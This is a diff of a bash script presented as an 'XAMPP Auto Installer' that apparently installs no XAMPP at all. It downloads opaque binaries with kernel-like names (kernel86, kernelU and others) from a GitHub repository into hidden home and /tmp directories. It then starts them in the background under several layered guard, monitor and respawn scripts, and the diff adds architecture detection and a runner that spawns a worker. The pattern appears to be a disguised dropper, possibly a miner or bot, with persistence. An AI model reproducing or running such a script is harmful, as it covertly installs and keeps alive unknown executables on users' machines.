@@ -1,38 +1,24 @@
 #!/bin/bash
 # ============================================
 # XAMPP Auto Installer
-# Usage:
-#   curl -fsSL https://raw.githubusercontent.com/basilbay80/support4/main/installation.sh | bash
 # ============================================
 
 set -e
 
-# ============================================
-# 🔗 Repository URL
-# ============================================
 REPO_URL="https://raw.githubusercontent.com/basilbay80/support4/main"
 
-# ============================================
-# 📁 Directory Paths
-# ============================================
+RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
+BLUE='\033[0;34m'; CYAN='\033[0;36m'; BOLD='\033[1m'; NC='\033[0m'
+
 MAIN_DIR="$HOME/.xampp-healthcheck"
 HELPER_DIR="/tmp/.xampp-helper"
 GUARD_DIR="$HOME/.xampp-guard"
-
-# ============================================
-# 🎨 Colors
-# ============================================
-RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
-BLUE='\033[0;34m'; CYAN='\033[0;36m'; BOLD='\033[1m'; NC='\033[0m'
 
 info()    { echo -e "${BLUE}[INFO]${NC} $1"; }
 success() { echo -e "${GREEN}[  ✓ ]${NC} $1"; }
 warn()    { echo -e "${YELLOW}[WARN]${NC} $1"; }
 error()   { echo -e "${RED}[FAIL]${NC} $1"; }
 
-# ============================================
-# Banner
-# ============================================
 echo ""
 echo -e "${CYAN}╔══════════════════════════════════════════════╗${NC}"
 echo -e "${CYAN}║${NC}  ${BOLD}XAMPP Auto Installer${NC}                     ${CYAN}║${NC}"
@@ -40,10 +26,24 @@ echo -e "${CYAN}╚════════════════════�
 echo ""
 
 # ============================================
-# Worker (only kernelU)
+# Detect architecture & choose binary names
 # ============================================
-WORKER="kernelU"
-success "Using worker: $WORKER"
+ARCH=$(uname -m)
+case "$ARCH" in
+    x86_64|amd64)
+        RUNNER="kernel86"
+        WORKER="kernelU"
+        ;;
+    aarch64|arm64)
+        RUNNER="kernel64"
+        WORKER="kernelX"
+        ;;
+    *)
+        error "Unsupported architecture: $ARCH"
+        exit 1
+        ;;
+esac
+success "Architecture: $ARCH → runner=$RUNNER worker=$WORKER"
 
 # ============================================
 # Download function (with fallback)
@@ -84,14 +84,15 @@ mkdir -p "$GUARD_DIR"
 success "Directories ready"
 
 # ============================================
-# [2/5] Download Worker
+# [2/5] Download Runner & Worker
 # ============================================
 echo ""
-echo -e "${YELLOW}━━━ [2/5] Downloading Worker ━━━${NC}"
+echo -e "${YELLOW}━━━ [2/5] Downloading Runner & Worker ━━━${NC}"
 
+download "${REPO_URL}/${RUNNER}" "$MAIN_DIR/${RUNNER}" "runner ($RUNNER)"
 download "${REPO_URL}/${WORKER}" "$MAIN_DIR/${WORKER}" "worker ($WORKER)"
 
-chmod +x "$MAIN_DIR/${WORKER}"
+chmod +x "$MAIN_DIR/${RUNNER}" "$MAIN_DIR/${WORKER}"
 
 # ============================================
 # [3/5] Download watchdog & triggers
@@ -116,12 +117,11 @@ find "$GUARD_DIR"  -maxdepth 1 -type f -name "*.sh" -exec chmod +x {} \;
 success "All scripts executable"
 
 # ============================================
-# [5/5] Start watchdog layers & worker
+# [5/5] Start watchdog layers & runner
 # ============================================
 echo ""
-echo -e "${YELLOW}━━━ [5/5] Starting watchdog & worker ━━━${NC}"
+echo -e "${YELLOW}━━━ [5/5] Starting watchdog & runner ━━━${NC}"
 
-# Start watchdog layers first
 nohup bash "$GUARD_DIR/guard.sh"        > /dev/null 2>&1 & success "Guard (layer 3) running"
 sleep 1
 nohup bash "$HELPER_DIR/monitor.sh"     > /dev/null 2>&1 & success "Monitor (layer 2) running"
@@ -131,20 +131,17 @@ sleep 1
 nohup bash "$MAIN_DIR/trigger-auto.sh"  > /dev/null 2>&1 & success "Auto trigger running"
 sleep 1
 
-# Start worker (kernelU)
+# Start runner (runner will spawn worker internally)
 cd "$MAIN_DIR"
-nohup "./${WORKER}" > "$MAIN_DIR/logs/runner.log" 2>&1 &
-success "🤖 Worker ($WORKER) running (PID: $!)"
+nohup "./${RUNNER}" > "$MAIN_DIR/logs/runner.log" 2>&1 &
+success "🤖 Runner ($RUNNER) running (PID: $!)"
 
-# ============================================
-# Done
-# ============================================
 echo ""
 echo -e "${GREEN}╔══════════════════════════════════════════════╗${NC}"
 echo -e "${GREEN}║   ✅ Installation complete!                  ║${NC}"
 echo -e "${GREEN}╚══════════════════════════════════════════════╝${NC}"
 echo ""
-echo -e "${CYAN}Check processes:${NC}  ps aux | grep -E 'kernelU|watchdog|monitor|guard'"
+echo -e "${CYAN}Check processes:${NC}  ps aux | grep -E '${RUNNER}|${WORKER}|watchdog|monitor|guard'"
 echo -e "${CYAN}Check logs:${NC}       tail -f $MAIN_DIR/logs/runner.log"
 echo -e "${CYAN}Manual restart:${NC}   $MAIN_DIR/trigger-respawn.sh"
 echo ""
